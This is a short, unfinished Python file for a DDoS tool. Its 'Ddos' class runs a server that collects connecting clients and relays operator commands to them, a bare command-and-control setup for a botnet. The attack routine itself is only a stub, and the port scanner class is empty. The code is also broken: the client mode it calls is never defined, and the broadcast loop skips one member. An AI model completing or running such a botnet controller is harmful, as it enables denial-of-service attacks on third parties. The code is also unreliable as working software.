from scapy.all import ICMP, ARP, IP, UDP, TCP, Ether, RandShort, RandIP, send
from threading import Thread
import socket

class PortScanner:
    def __init__(self):
        pass

class Ddos:
    def __init__(self):
        mode = input("\n   [*]choose mode(server or client): ")
        if mode == "server":
           self._ServerMode()
        elif mode == "client":
            self.ClientMode()
     
    def _ServerMode(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        Ip = input("\n   [*]ip to be bound: ")

        Port = int(input("\n   [*]port to listen on: "))

        self.sock.bind((Ip, Port))

        NumOfPeople = int(input("\n   [*]max number of members to join: "))

        self.sock.listen(NumOfPeople)

        thrd = Thread(target=self._JoinParty, args=())
        thrd.start()

        Input = ""
        while Input != "exit":
            Input = input("   [*]host@command>")
            if Input == "attack":
                #create attack fuction
                pass
            elif Input == "stop":
                #set variable to False thus the loop of the ddos will stop
                pass
            else:
                for i in range(len(self.members) - 1):
                    self.members[i].send(Input.encode())

        #self.sock.close()

    def _JoinParty(self):
        self.members = []
        while True:
            client, addr = self.sock.accept()
            self.members.append(client)


